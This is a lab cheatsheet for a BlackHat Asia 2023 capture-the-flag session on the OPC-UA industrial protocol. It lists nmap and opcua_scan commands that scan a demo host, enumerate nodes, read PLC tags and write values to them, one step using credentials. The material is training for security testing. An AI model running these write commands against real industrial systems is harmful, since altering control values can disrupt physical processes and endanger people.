# BlackHat Arsenal Singapore 2023: OPC-U-HACK
Slides &amp; content for our [Arsenal lab session](https://www.blackhat.com/asia-23/arsenal/schedule/index.html#industrial-control-systems-capture-the-train-31924)
 at BlackHat Asia 2023

This arsenal lab session aims at introducing the OPC-UA protocol, a modern protocol for Industrial Control Systems.
A demo setup will be provided and our tool [opcua-scan](https://github.com/wavestone-cdt/opcua-scan) will be used.

# Cheatsheet

Find below a few of commands that should help you flag!

### RECON#01
Scan the machine: ```nmap -p- 192.168.0.20```

Look for OPC-UA services: ```./opcua_scan.py hello -i 192.168.0.20 -p '49320, 49321, 49664, 49665, 49666, 49667, 49670, 49679, 49681'```

### RECON#02 & RECON#03
Use of the IP because there is no working DNS
```./opcua_scan.py server_config -t 'opc.tcp://192.168.0.20:49321'```

### RECON#04
List nodes that you can write to
```./opcua_scan.py server_config -t 'opc.tcp://192.168.0.20:49320' -nw```

List all the nodes
```./opcua_scan.py read_data -t 'opc.tcp://192.168.0.20:49320'```

```./opcua_scan.py read_data -t 'opc.tcp://192.168.0.20:49320' -r 'i=85'```

```./opcua_scan.py read_data -t 'opc.tcp://192.168.0.20:49320' -r 'ns=2;s=ModbusPLC-10-3-0-150'```

…

…

### RECON#05
```./opcua_scan.py read_data -t 'opc.tcp://192.168.0.20:49320'```

```./opcua_scan.py read_data -t 'opc.tcp://192.168.0.20:49320' -r 'i=85'```*

…

…

### READ_DATA#01
```./opcua_scan.py read_data -t 'opc.tcp://192.168.0.20:49320' -r 'ns=2;s=ModbusPLC-10-3-0-150.Device2.XXX'```

### READ_DATA#02
```./opcua_scan.py read_data -t 'opc.tcp://192.168.0.20:49320' -r 'ns=2;s=ModbusPLC-10-3-0-150.Device2.XXX'```

### WRITE_DATA#01
```./opcua_scan.py write_data -t 'opc.tcp://192.168.0.20:49320' -r 'ns=2;s=ModbusPLC-10-3-0-150.Device2.part_1_up' -d True```

### WRITE_DATA#02
This one is a little bit more complex! Several steps are involved, one of which is exploiting dynamic tags

```./opcua_scan.py write_data -t 'opc.tcp://192.168.0.20:49320' -r 'ns=2;s=ModbusPLC-10-3-0-150.Device2.XXXX' -a Use
rname -u XXX -p XXX -d True```

